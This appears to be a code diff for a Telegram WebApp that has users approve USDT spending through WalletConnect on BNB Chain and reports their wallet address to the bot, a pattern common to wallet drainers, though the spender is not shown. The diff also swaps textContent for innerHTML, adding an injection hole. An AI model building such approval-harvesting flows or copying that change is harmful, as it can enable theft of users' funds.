@@ -29,7 +29,7 @@
     import { ethers } from 'https://esm.sh/ethers@6.14.3';
 
     const { Interface, parseUnits, getAddress } = ethers;
-    const tg = window.Telegram.WebApp;
+    const tg = window.Telegram?.WebApp;
     if (tg) tg.ready();
 
     const setStatus = (msg, color="#4fc3f7") => {
@@ -40,7 +40,7 @@
 
     const setURI = (uri) => {
       const el = document.getElementById("manual-uri");
-      el.textContent = uri;
+      el.innerHTML = uri;
       if (tg) {
         const link = document.createElement("a");
         link.textContent = "Открыть кошелёк";
@@ -58,11 +58,19 @@
           relayUrl: "wss://relay.walletconnect.com",
           metadata: {
             name: "AutoSwap Approve Flow",
-            description: "Approve USDT via WalletConnect for AutoSwap", // обязательно  [oai_citation:0‡github.com](https://github.com/blocknative/web3-onboard/issues/1783?utm_source=chatgpt.com)
+            description: "Approve USDT via WalletConnect for AutoSwap", // 🟢 обязательно 
             url: location.href,
             icons: ["https://walletconnect.com/favicon.ico"]
           }
         });
+
+        // Проверка существующей сессии, чтобы не генерировать QR бесконечно 
+        const sessions = await client.session.getAll();
+        if (sessions.length > 0) {
+          const address = sessions[0].namespaces.eip155.accounts[0].split(":")[2];
+          setStatus(`🔁 Уже подключён: ${address}`, "#66bb6a");
+          return;
+        }
 
         setStatus("📷 Генерация QR‑кода…");
         const { uri, approval } = await client.connect({
@@ -70,7 +78,7 @@
             eip155: {
               chains: ["eip155:56"],
               methods: ["eth_sendTransaction"],
-              events: ["chainChanged","accountsChanged"]
+              events: ["chainChanged", "accountsChanged"]
             }
           }
         });
@@ -103,9 +111,10 @@
         setStatus(`✅ Approve отправлен:\n${txHash}`, "#66bb6a");
 
         if (tg) tg.sendData(JSON.stringify({ address }));
+
       } catch (e) {
         console.error(e);
-        setStatus(`❌ Ошибка: ${e.message||e.reason}`, "#ff6b6b");
+        setStatus(`❌ Ошибка: ${e.message || e.reason}`, "#ff6b6b");
       }
     }
 
